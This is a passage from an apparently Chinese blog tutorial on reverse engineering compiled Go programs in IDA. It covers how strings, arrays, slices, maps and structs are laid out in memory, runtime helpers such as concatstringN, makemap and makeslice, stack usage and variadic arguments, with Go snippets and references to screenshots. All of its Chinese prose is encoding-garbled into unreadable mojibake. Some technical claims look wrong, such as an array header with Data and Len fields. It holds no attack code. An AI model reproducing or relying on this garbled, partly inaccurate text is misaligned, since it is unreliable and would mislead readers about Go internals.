ä¸­å£°æ˜å­—ç¬¦ä¸²æ˜¯å£°æ˜äº†ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ç»“æ„åœ¨å†…å­˜ä¸­åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œç»“æ„ä¸­ä½¿ç”¨ä¸¤ä¸ªå­—æ®µå­˜å‚¨å­—ç¬¦ä¸²ä¿¡æ¯ï¼Œåˆ†åˆ«å­˜å‚¨å­—ç¬¦ä¸²æŒ‡é’ˆä»¥åŠå­—ç¬¦ä¸²é•¿åº¦ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> StringHeader <span class="hljs-keyword">struct</span>&#123;<br>Data <span class="hljs-type">uintptr</span> <span class="hljs-comment">//å­—ç¬¦ä¸²é¦–åœ°å€</span><br>Len <span class="hljs-type">int</span>  <span class="hljs-comment">//å­—ç¬¦ä¸²é•¿åº¦</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²çš„å¤§å°ç”±å­˜å‚¨å­—ç¬¦ä¸²é•¿åº¦çš„å­—æ®µå†³å®šï¼Œç¨‹åºé€šè¿‡è®¿é—®å­—ç¬¦ä¸²æŒ‡é’ˆå­—æ®µæ¥ä½¿ç”¨å­—ç¬¦ä¸²ã€‚</p><p>åœ¨é€†å‘ä¸­é‡ç‚¹å…³æ³¨çš„æ˜¯å¦‚ä¸Šç»“æ„ï¼Œå› æ­¤è¯´ä¸€ä¸ª<code>string</code>å¯¹è±¡å ä¸¤ä¸ªå­—é•¿ï¼Œå…¶å®ƒç»“æ„ä¹ŸæŒ‰è¿™ç§çº¦å®šã€‚</p><p>ä¾‹å¦‚è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒä¼šå°†ä¸Šè¿°ç»“æ„å…¥æ ˆï¼Œç”±äºæ²¡æœ‰ç»ˆæ­¢ç¬¦ IDA æ— æ³•æ­£å¸¸è¯†åˆ«å­—ç¬¦ä¸²ç»“æŸç¬¦å› æ­¤è¾“å‡ºäº†å¾ˆå¤šä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦ä¾é å®ƒçš„ç¬¬äºŒä¸ªåŸŸå†³å®šå®ƒçš„ç»“æŸä½ç½®ï¼š</p><ul><li>å­—ç¬¦ä¸²æ‹¼æ¥</li></ul><p>å­—ç¬¦ä¸²çš„å¸¸è§æ“ä½œæ˜¯å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè‹¥æ‹¼æ¥çš„å­—ç¬¦ä¸²ä¸ªæ•°ä¸è¶…è¿‡ 5ï¼Œåˆ™è°ƒç”¨<code>concatstringN</code>ï¼Œå¦åˆ™ä¼šè°ƒç”¨<code>concatstrings</code>ï¼Œå‡½æ•°å£°æ˜å¦‚ä¸‹ï¼Œå¯è§åœ¨å¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥æ—¶å‚æ•°å½¢å¼ä¸åŒï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ä¸¤ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">concatstring2</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>)</span></span><span class="hljs-type">string</span><br><span class="hljs-comment">// ä¸‰ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä¾æ­¤ç±»æ¨</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">concatstring3</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>)</span></span><span class="hljs-type">string</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">concatstring4</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>)</span></span><span class="hljs-type">string</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">concatstring5</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>)</span></span><span class="hljs-type">string</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">concatstrings</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>,[]<span class="hljs-type">string</span>)</span></span><span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><p>å› æ­¤åœ¨é‡åˆ°<code>concatstringN</code>æ—¶å¯ä»¥è·³è¿‡ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œéšåå…¥æ ˆçš„å‚æ•°å³ä¸ºå­—ç¬¦ä¸²ï¼Œè€Œé‡åˆ°<code>concatstringN</code>æ—¶ï¼Œè·³è¿‡ç¬¬ä¸€ä¸ªå‚æ•°åæ±‡ç¼–å±‚é¢è¿˜å‰©ä¸‰ä¸ªå‚æ•°ï¼Œå…¶å®ƒåä¸¤ä¸ªä¸€èˆ¬ç›¸åŒä¸”æŒ‡æ˜å­—ç¬¦ä¸²ä¸ªæ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°åˆ™æŒ‡æ˜å­—ç¬¦ä¸²æ•°ç»„çš„é¦–åœ°å€ã€‚</p><p><img src="/assets/Pasted%20image%2020250108093459.png"></p><h3 id="array"><a href="#array" class="headerlink" title="array"></a>array</h3><p>ç±»ä¼¼ C æŠŠå­—ç¬¦ä¸²çœ‹ä½œ char æ•°ç»„ï¼Œarray å’Œ string çš„ç»“æ„ç±»ä¼¼ï¼Œå…¶çœŸå®æ•°æ®ä¹Ÿæ˜¯åœ¨å†…å­˜é‡Œè¿ç»­å­˜æ”¾ï¼Œè€Œä½¿ç”¨å¦‚ä¸‹ç»“æ„ç´¢å¼•æ•°æ®ï¼Œå¯¹æ•°ç»„é‡Œçš„å…ƒç´ è®¿é—®å…¶åœ°å€åç§»åœ¨ç¼–è¯‘æ—¶å°±èƒ½ç¡®å®šï¼Œæ€»ä¹‹é€†å‘è§’åº¦çœ‹å®ƒä¹Ÿæ˜¯å ä¸¤ä¸ªå­—é•¿ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> arrayHeader <span class="hljs-keyword">struct</span>&#123;<br>Data <span class="hljs-type">uintptr</span> <span class="hljs-comment">//é¦–å…ƒç´ åœ°å€</span><br>Len <span class="hljs-type">int</span> <span class="hljs-comment">//æ•°ç»„é•¿åº¦</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ•°ç»„æœ‰ä¸‰ç§å­˜å‚¨ä½ç½®ï¼Œå½“æ•°ç»„å†…å…ƒç´ è¾ƒå°‘æ—¶å¯ä»¥ç›´æ¥å­˜äºæ ˆä¸Šï¼Œè¾ƒå¤šæ—¶å­˜äºæ•°æ®åŒºï¼Œè€Œå½“æ•°æ®ä¼šè¢«è¿”å›æ—¶ä¼šå­˜äºå †ä¸Šã€‚å¦‚ä¸‹å®šä¹‰äº†ä¸‰ä¸ªå±€éƒ¨å˜é‡ï¼Œä½†æ˜¯å®ƒä»¬å°†åœ¨åº•å±‚è¡¨ç°å‡ºä¸åŒçš„å½¢æ€ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Getarray</span><span class="hljs-params">()</span></span> *[<span class="hljs-number">3</span>]<span class="hljs-type">int</span> &#123;<br>a:=[...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br>b:=[...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;<br>c:=[...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)&lt;<span class="hljs-built_in">len</span>(b)&#123;<br><span class="hljs-keyword">return</span> &amp;c<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å˜é‡ a çš„æ±‡ç¼–å¦‚ä¸‹ï¼Œå®ƒç›´æ¥åœ¨æ ˆä¸Šå®šä¹‰å¹¶åˆå§‹åŒ–ï¼š</p><p><img src="/assets/Pasted%20image%2020250403005153.png"></p><p>å˜é‡ b çš„æ±‡ç¼–å¦‚ä¸‹ï¼Œå®ƒçš„åˆå§‹å€¼è¢«å®šä¹‰åœ¨äº†æ•°æ®æ®µ</p><p>å…¶ä¸­loc_4668a6 æ˜¯æ•°æ®æ‹·è´å‡½æ•°ï¼Œè‹¥ç¬¦å·ä¿¡æ¯å®Œæ•´é‡åˆ°æ— æ³•è¯†åˆ«å‡ºçš„å‡½æ•°ä¸€èˆ¬ä¹Ÿå°±æ˜¯æ•°æ®æ‹·è´å‡½æ•°ã€‚</p><p>å˜é‡ c çš„æ±‡ç¼–å¦‚ä¸‹ï¼Œå°½ç®¡å®ƒå’Œaçš„å€¼ä¸€æ ·ï¼Œä½†æ˜¯ Go ä½œä¸ºå†…å­˜å®‰å…¨çš„è¯­è¨€ï¼Œå…¶é€šè¿‡runtime.newobjectåœ¨å †ä¸Šç”³è¯·ç©ºé—´æ¥é‡Šæ”¾è¯¥å¯¹è±¡ï¼Œè¿”å›çš„æ˜¯æ–°çš„å¯¹è±¡æŒ‡é’ˆã€‚</p><p>golangçš„è¿”å›å€¼é€šè¿‡æ ˆä¼ é€’</p><h3 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h3><p>ç±»ä¼¼æ•°ç»„ï¼Œåˆ‡ç‰‡çš„å®ä¾‹å¯¹è±¡æ•°æ®ç»“æ„å¦‚ä¸‹ï¼Œå¯çŸ¥å®ƒå ç”¨äº†ä¸‰ä¸ªå­—é•¿ï¼Œä¸å®ƒç›¸å…³çš„å‡½æ•°æ˜¯<code>growslice</code>ï¼Œè¡¨ç¤ºæ‰©å®¹ï¼Œé€†å‘æ—¶å¯å¿½ç•¥ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SliceHeader <span class="hljs-keyword">struct</span> &#123;<br>Data <span class="hljs-type">uintptr</span> <span class="hljs-comment">//æ•°æ®æŒ‡é’ˆ</span><br>Len  <span class="hljs-type">int</span>     <span class="hljs-comment">//å½“å‰é•¿åº¦</span><br>Cap  <span class="hljs-type">int</span>     <span class="hljs-comment">//å¯å®¹çº³çš„é•¿åº¦</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ›´å¸¸è§çš„å‡½æ•°æ˜¯ä¸å­—ç¬¦ä¸²ç›¸å…³çš„è½¬æ¢ï¼Œå®ƒä»¬åœ¨åº•å±‚è°ƒç”¨çš„æ˜¯å¦‚ä¸‹å‡½æ•°ï¼Œæ­¤å¤„æˆ‘ä»¬ä¾ç„¶ä¸å¿…å…³æ³¨ç¬¬ä¸€ä¸ªå‚æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">slicebytetostring</span><span class="hljs-params">(buf*[32]<span class="hljs-type">byte</span>, ptr *<span class="hljs-type">byte</span>, n <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">string</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">stringtoslicebyte</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>, <span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">byte</span><br></code></pre></td></tr></table></figure><ul><li>ä¾‹</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-type">string</span> = <span class="hljs-string">&quot;hello world&quot;</span><br><span class="hljs-keyword">var</span> b []<span class="hljs-type">byte</span> = []<span class="hljs-type">byte</span>(a)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>å­—å…¸å®ç°æ¯”è¾ƒå¤æ‚ï¼Œä¸è¿‡åœ¨é€†å‘ä¸­ä¼šæ¶‰åŠåˆ°çš„å†…å®¹å¾ˆç®€å•ï¼Œå­—å…¸æ“ä½œå¸¸è§çš„ä¼šè½¬æ¢ä¸ºå¦‚ä¸‹å‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fastrand</span><span class="hljs-params">()</span></span> <span class="hljs-type">uint32</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makemap</span><span class="hljs-params">(mapType *<span class="hljs-type">byte</span>, hint <span class="hljs-type">int</span>, mapbuf *any)</span></span> (hmap <span class="hljs-keyword">map</span>[any]any)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapaccess1</span><span class="hljs-params">(mapType *<span class="hljs-type">byte</span>, hmap <span class="hljs-keyword">map</span>[any]any, key *any)</span></span> (val *any)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapaccess2</span><span class="hljs-params">(mapType *<span class="hljs-type">byte</span>, hmap <span class="hljs-keyword">map</span>[any]any, key *any)</span></span> (val *any, pres <span class="hljs-type">bool</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapassign</span><span class="hljs-params">(mapType *<span class="hljs-type">byte</span>, hmap <span class="hljs-keyword">map</span>[any]any, key *any)</span></span> (val *any)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapiterinit</span><span class="hljs-params">(mapType *<span class="hljs-type">byte</span>, hmap <span class="hljs-keyword">map</span>[any]any, hiter *any)</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapiternext</span><span class="hljs-params">(hiter *any)</span></span><br></code></pre></td></tr></table></figure><ul><li>åˆ›å»ºï¼šä¸€èˆ¬<code>fastrand</code>å’Œ<code>makemap</code>è¿ç”¨è¿”å›ä¸€ä¸ª<code>map</code>æŒ‡é’ˆã€‚</li><li>è¯»å–ï¼šè¯»å­—å…¸æ—¶ä½¿ç”¨<code>mapaccess1</code>å’Œ<code>mapaccess2</code>ã€‚</li><li>å†™å…¥ï¼šå†™å­—å…¸æ—¶ä¼šä½¿ç”¨<code>mapassign</code>å‡½æ•°ï¼Œå®ƒè¿”å›ä¸€ä¸ªåœ°å€ï¼Œå°†<code>value</code>å†™å…¥è¯¥åœ°å€ã€‚</li></ul><p>å¦å¤–æ¯”è¾ƒå¸¸è§çš„æ˜¯å¯¹å­—å…¸è¿›è¡Œéå†ï¼Œä¼šä½¿ç”¨<code>mapiterinit</code>å’Œ<code>mapiternext</code>é…åˆã€‚</p><p>äº‹å®ä¸Šæ›´å¸¸è§çš„æ˜¯ä¸Šé¢è¿™äº›å‡½æ•°çš„åŒç±»å‡½æ•°ï¼Œå®ƒä»¬çš„åç¼€ä»£è¡¨äº†å¯¹ç‰¹å®šç±»å‹çš„ä¼˜åŒ–ï¼Œä¾‹å¦‚å¦‚ä¸‹ä»£ç ï¼š</p><ul><li>ä¾‹</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>a := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">32</span>,<br>&#125;<br>a[<span class="hljs-string">&quot;age&quot;</span>] = <span class="hljs-number">19</span><br>fmt.Println(a[<span class="hljs-string">&quot;id&quot;</span>])<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>ç±»ä¼¼ C è¯­è¨€ï¼ŒGo çš„ç»“æ„ä½“ä¹Ÿæ˜¯ç”±å…¶å®ƒç±»å‹ç»„æˆçš„ç¬¦å·ç»“æ„ï¼Œå®ƒé‡Œé¢åŸŸçš„é¡ºåºä¹Ÿæ˜¯å®šä¹‰çš„é¡ºåºï¼Œé‡Œé¢çš„æ•°æ®å¯¹é½è§„åˆ™å’Œ C ä¸€è‡´ä¸è¿‡æˆ‘ä»¬å¯ä»¥ç›´æ¥ä»å…¶ç±»å‹ä¿¡æ¯è·å¾—ï¼Œä¸å¿…è‡ªå·±ç®—ã€‚åœ¨åˆ†æç»“æ„ä½“å˜é‡æ—¶å¿…é¡»è¦äº†è§£ç»“æ„ä½“çš„ç±»å‹ç»“æ„äº†ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> rtype <span class="hljs-keyword">struct</span>&#123;<br>size      <span class="hljs-type">uintptr</span>  <span class="hljs-comment">//è¯¥ç±»å‹å¯¹è±¡å®ä¾‹çš„å¤§å°</span><br>ptrdata   <span class="hljs-type">uintptr</span>  <span class="hljs-comment">//rtype å¯ä»¥åŒ…å«æŒ‡é’ˆçš„å­—èŠ‚æ•°</span><br>hash      <span class="hljs-type">uint32</span>   <span class="hljs-comment">//rtype å“ˆå¸Œå€¼ï¼šé¿å…å“ˆå¸Œè¡¨ä¸­çš„è®¡ç®—</span><br>tflag     tflag    <span class="hljs-comment">//é¢å¤–çš„ç±»å‹ä¿¡æ¯æ ‡è¯†</span><br>align     <span class="hljs-type">uint8</span>    <span class="hljs-comment">//å½“å‰å…·ä½“ç±»å‹å˜é‡çš„å†…å­˜å¯¹é½</span><br>kind      <span class="hljs-type">uint8</span>    <span class="hljs-comment">//å…·ä½“ kind çš„æšä¸¾å€¼</span><br>alg       *typeAlg <span class="hljs-comment">//ç®—æ³•è¡¨</span><br>gcdata    *<span class="hljs-type">byte</span>    <span class="hljs-comment">//åƒåœ¾å›æ”¶æ•°æ®</span><br>str       nameoff  <span class="hljs-comment">//å­—ç¬¦ä¸²æ ¼å¼</span><br>ptrToThis typeoff  <span class="hljs-comment">//æŒ‡å‘è¯¥ç±»å‹çš„æŒ‡é’ˆ </span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> structField <span class="hljs-keyword">struct</span> &#123;<br>name        name    <span class="hljs-comment">//å±æ€§åç§°</span><br>typ         *rtype  <span class="hljs-comment">//è¯¥åŸŸçš„ç±»å‹</span><br>offsetEmbed <span class="hljs-type">uintptr</span> <span class="hljs-comment">//offsetEmbed&gt;&gt;1 å¾—åˆ°è¯¥å±æ€§åœ¨å¯¹è±¡ä¸­çš„åç§»</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> structType <span class="hljs-keyword">struct</span> &#123;<br>typ     _type<br>pkgPath name           <span class="hljs-comment">//åŒ…å</span><br>fields  []structField  <span class="hljs-comment">//åŸŸæ•°ç»„</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> uncommonType <span class="hljs-keyword">struct</span>&#123;<br>pkgPath nameoff <span class="hljs-comment">//åŒ…è·¯å¾„</span><br>mcount  <span class="hljs-type">uint16</span>  <span class="hljs-comment">//æ–¹æ³•æ•°</span><br>xcount  <span class="hljs-type">uint16</span>  <span class="hljs-comment">//å¯¼å‡ºçš„æ–¹æ³•æ•°</span><br>moff    <span class="hljs-type">uint32</span>  <span class="hljs-comment">//æ–¹æ³•æ•°ç»„çš„åç§»</span><br>-       <span class="hljs-type">uint32</span>  <span class="hljs-comment">//unused</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> structTypeUncommon <span class="hljs-keyword">struct</span> &#123;<br>structType<br>u uncommonType<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚ä¸‹ä¸º macaron çš„ Context ç»“æ„ä½“çš„ç±»å‹ä¿¡æ¯ï¼Œå¯è§å®ƒçš„å®ä¾‹å¯¹è±¡å äº† 0x90 å­—èŠ‚ï¼Œè¿™å®é™…ä¸Šä¼šå’Œä¸‹é¢ fields ä¸­å¯¹è±¡æ‰€å ç©ºé—´å¯¹åº”ï¼š</p><h2 id="è¯­æ³•ç‰¹æ€§"><a href="#è¯­æ³•ç‰¹æ€§" class="headerlink" title="è¯­æ³•ç‰¹æ€§"></a>è¯­æ³•ç‰¹æ€§</h2><h3 id="æ–°å»ºå¯¹è±¡"><a href="#æ–°å»ºå¯¹è±¡" class="headerlink" title="æ–°å»ºå¯¹è±¡"></a>æ–°å»ºå¯¹è±¡</h3><p>Go ä¸æ˜¯é¢å‘å¯¹è±¡çš„è¯­è¨€ï¼Œæ­¤å¤„å°† Go çš„å˜é‡å½“ä½œå¯¹è±¡æ¥æè¿°ã€‚</p><p>åŠ¨æ€åˆ›å»ºæ—¶ä¼šåœ¨å †åŒºåˆ›å»ºå¯¹è±¡ï¼Œè¿™é‡Œæ¶‰åŠ<code>make</code>å’Œ<code>new</code>ä¸¤ä¸ªå…³é”®è¯ï¼Œä¸è¿‡åœ¨æ±‡ç¼–å±‚é¢å®ƒä»¬åˆ†åˆ«å¯¹åº”ç€<code>makechan</code>ã€<code>makemap</code>ã€<code>makeslice</code>ä¸<code>newobject</code>ï¼Œå¦‚<code>makeslice</code>ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeslice</span><span class="hljs-params">(et *_type,<span class="hljs-built_in">len</span>,<span class="hljs-built_in">cap</span> <span class="hljs-type">int</span>)</span></span> unsafe.Pointer<br></code></pre></td></tr></table></figure><ul><li>ä¾‹</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>a := <span class="hljs-built_in">make</span>([]<span class="hljs-type">uint8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨<code>make([]uint8,5,10)</code>åˆ›å»ºä¸€ä¸ª<code>slice</code>åï¼Œä¼šç”Ÿæˆæ­¤ä»£ç ï¼š</p><p><img src="/assets/Pasted%20image%2020250108113935.png"></p><h3 id="å‡½æ•°ä¸æ–¹æ³•"><a href="#å‡½æ•°ä¸æ–¹æ³•" class="headerlink" title="å‡½æ•°ä¸æ–¹æ³•"></a>å‡½æ•°ä¸æ–¹æ³•</h3><ul><li>æ ˆç©ºé—´</li></ul><p>æ ˆå¯ä»¥åˆ†ä¸ºä¸¤ä¸ªåŒºåŸŸï¼Œåœ¨æ ˆåº•éƒ¨å­˜æ”¾å±€éƒ¨å˜é‡ï¼Œæ ˆé¡¶éƒ¨åšå‡½æ•°è°ƒç”¨ç›¸å…³çš„å‚æ•°ä¸è¿”å›å€¼ä¼ é€’ã€‚</p><p>å› æ­¤åœ¨åˆ†ææ—¶ä¸èƒ½å¯¹é¡¶éƒ¨çš„<code>var</code>å‘½åï¼Œå› ä¸ºå®ƒä¸ç‰¹è´¨æŸå…·ä½“å˜é‡è€Œæ˜¯éšæ—¶åœ¨å˜åŒ–çš„ï¼Œé”™è¯¯çš„å‘½åå®¹æ˜“é€ æˆæ··æ·†ï¼Œå¦‚ä¸‹å›¾ï¼Œ0xE60 è· 0xEC0 è¶³å¤Ÿè¿œï¼Œå› æ­¤æ­¤å¤„å¾ˆå¤§æ¦‚ç‡æ˜¯å±€éƒ¨å˜é‡å¯é‡å‘½åï¼Œè€Œ 0xEB8 è·æ ˆé¡¶å¾ˆè¿‘ï¼Œå¾ˆå¤§æ”¹äº†æ˜¯ç”¨äºä¼ å‚çš„ï¼Œä¸è¦é‡å‘½åï¼š</p><p><img src="/assets/Pasted%20image%2020250417142443.png"></p><ul><li>å¯å˜å‚æ•°</li></ul><p>ç±»ä¼¼ Python çš„ä¸€èˆ¬å˜å‚å®é™…è¢«è½¬åŒ–ä¸ºä¸€ä¸ª tupleï¼ŒGo å˜å‚ä¹Ÿè¢«è½¬æ¢ä¸ºäº†ä¸€ä¸ª sliceã€‚å› æ­¤ä¸€ä¸ªå˜å‚åœ¨æ±‡ç¼–çº§åˆ«å  3 ä¸ª å‚æ•°ä½ï¼Œå¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">VarArgDemo</span><span class="hljs-params">(args ...<span class="hljs-type">int</span>)</span></span>(sum <span class="hljs-type">int</span>)&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>varArgDemo(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ƒä¼šè¢«ç¼–è¯‘ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><p><img src="/assets/Pasted%20image%2020250417142956.png"></p><ul><li>æ–¹æ³•</li></ul><p>Go 